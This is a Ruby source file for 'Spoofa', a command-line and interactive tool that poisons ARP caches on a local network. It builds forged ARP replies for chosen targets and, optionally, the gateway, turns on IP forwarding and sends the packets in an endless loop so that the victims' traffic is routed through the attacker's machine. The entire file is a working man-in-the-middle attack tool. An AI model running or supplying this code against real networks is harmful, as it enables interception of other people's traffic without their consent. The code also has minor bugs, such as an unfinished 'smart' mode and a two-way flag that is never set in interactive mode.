#!/usr/bin/env ruby

# SPOOFA - for ARP-spoofing local networks

# (C) 2013 Vulpi Argenti (SilverFoxx)

require 'packetfu'
require 'optparse'
require 'ostruct'
require 'ipaddr'

# What mode are we running in?
if ARGV.empty?
  interactive = true
else # Parse the command-line options
  unless ARGV.include?("-i")
    puts "Interface is required. See spoofa.rb -h.\nTry again"
    sleep 2 
  exit 0
  end
  options = OpenStruct.new
  OptionParser.new do |opts|
    opts.banner = "Usage: spoofa.rb # interactive mode\nUsage: spoofa.rb [-hmv] [-t target(s)] [-g gateway] -i interface # command-line mode"
    opts.separator ""
    opts.separator "Specific options:"

    opts.on("-v", "--verbose", "Run verbosely") do |v|
      options.verbose = v
    end

    opts.on("-m", "--smart", "NOT WORKING YET Smart ARPing; attempts to monitor ARP requests from the target(s), and only reply as necessary. If not set, ARP packets are sent continuously.") do |m|
      options.smart = m
    end

    opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, the entire subnet will be targeted. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
      options.target = target
    end

    opts.on("-g", "--gateway <gateway IP>", "With [-t] set, performs two-way spoofing.") do |gateway|
      options.gateway = gateway
    end

    opts.on("-i", "--interface <interface>", "Interface") do |interface|
      options.interface = interface
    end

    opts.on("-h", "--help", "You're looking at it. If it's not good enough, try the README.md at https://github.com/SilverFoxx/Spoofa") do |h|
      puts opts
      exit 0
    end
  end.parse!
end

#------------------------------------------------------#
# Assorted methods

def ip_check(ip)
  true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
end

def puts_verbose(text)
  puts text if @verbose
end

def target_parse(target)
  target = target.split(",")
  @target = []                                          # Array of target ip's
  @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
  target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
  target.each do |range|                                # Separate range(s) into start and end addresses
    from 	= range[/\A(\w*.){3}(\w*)/]			
    to 		= range[/\A(\w*.){3}/] + range.split("-")[1]	
    ip_from 	= IPAddr.new(from)
    ip_to 		= IPAddr.new(to)
    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
  end
end

#------------------------------------------------------#
# Let's set some defaults and variables

if interactive
  @verbose = true

  @defaults = PacketFu::Utils.ifconfig
  @iface = @defaults[:iface] 
  print "Default interface appears to be #{@iface}.\nEnter to accept #{@iface}, or type an alternative: "
  temp = gets.chomp
  unless temp.empty?
    @iface = temp
    @defaults = PacketFu::Utils.ifconfig(@iface)               # Iface changed, therefore need new defaults
  end

  until ip_check(@gateway) do
    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Guess gateway by parsing netstat
    @gateway = ((net[0]).split)[1] 
    if ip_check(@gateway)
    print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
    else
      print "Unable to determine gateway. Please enter IP: "
    end
    temp = gets.chomp
    @gateway = temp unless temp.empty?
    if !ip_check(@gateway)
      puts "Invalid IP address. Try again..."
      sleep 1
    end 
  end

  var = false
  until var 
    print "Spoof target only (1-way), or router as well (2-way)? (1/2): "
    var = gets.chomp
    if  var == "2"
      @two_way
    elsif var == "1"
      @two_way = false
    else
      var = false
      puts "Must enter \"1\" or \"2\"."
      sleep 1
    end
  end

=begin
smart = false
until smart 
print "Are we smart arping? (y/n): "
smart = gets.chomp.downcase
if  smart == "y"
@smart
elsif smart == "n"
@smart = false
else
smart = false
puts "Fat-finger!"
sleep 1
end
end
=end

  print "Enter target IP: "
  target = gets.chomp

# CL mode	
else 	
  @verbose  = options.verbose
  #@smart   = options.smart
  @iface    = options.interface
  target    = options.target
  @gateway  = options.gateway
  @defaults = PacketFu::Utils.ifconfig(@iface)

  if @verbose
=begin
if @smart
var1 = "Smart s"
else
var1 = "S"
end
=end	
var1 = "S"
    if @gateway
      var2 = "two-way with gateway #{@gateway}."
    else
      var2 = "one-way."
    end
    puts "#{var1}poofing #{target} on #{@iface}, #{var2}"
  end

  @two_way = true
  if !@gateway
    @two_way = false
    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
    @gateway = ((net[0]).split)[1]
  end 
  unless ip_check(@gateway)
    print "Unable to verify gateway address. Try again with 2-way spoofing, or interactive mode."
    sleep 2
    exit 0
  end
end

target_parse(target)
puts_verbose("\nObtaining mac addresses...")
@targets_hash = {}
gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
unless gateway_mac 
  (0..1).map { gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
  puts "Unable to determine gateway mac."
  sleep 2
  exit 0 
end
puts_verbose "#{@gateway}: mac is #{gateway_mac} (Gateway)"
@target.each do |ip|
  target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
  @targets_hash[ip] = target_mac     # Makes hash of target ips => target macs
  if target_mac
    puts_verbose "#{ip}: mac is #{target_mac}"
  else
    puts_verbose "#{ip}: is down"
  end
end
@targets_hash.delete_if { |k, v| v.nil? }

#------------------------------------------------------#
# Make arrays of packets for targets and gateway

@target_packets  = []
@gateway_packets = []
@targets_hash.each do |target, target_mac|
  arp_packet_target     = PacketFu::ARPPacket.new
  arp_packet_target.arp_opcode = 2
  arp_packet_target.eth_saddr = arp_packet_target.arp_saddr_mac = @defaults[:eth_saddr]
  arp_packet_target.eth_daddr = arp_packet_target.arp_daddr_mac = target_mac
  arp_packet_target.arp_saddr_ip = @gateway
  arp_packet_target.arp_daddr_ip = target

  @target_packets << arp_packet_target
end
if @two_way
  @targets_hash.each do |target, |
    arp_pkt_gateway      = PacketFu::ARPPacket.new
    arp_pkt_gateway.arp_opcode = 2
    arp_pkt_gateway.eth_saddr = arp_pkt_gateway.arp_saddr_mac = @defaults[:eth_saddr]
    arp_pkt_gateway.eth_daddr = arp_pkt_gateway.arp_daddr_mac = gateway_mac
    arp_pkt_gateway.arp_saddr_ip = target
    arp_pkt_gateway.arp_daddr_ip = @gateway

    @gateway_packets  << arp_pkt_gateway
  end
end
    
`echo 1 > /proc/sys/net/ipv4/ip_forward`
send_packets = true
while send_packets
  while true
    @target_packets.each do |pkt|
      pkt.to_w(@iface)
    end
    @gateway_packets.each do |pkt|
      pkt.to_w(@iface)
    end
    GC.start   # to deal with memory leak
    sleep 1.5
  end
end
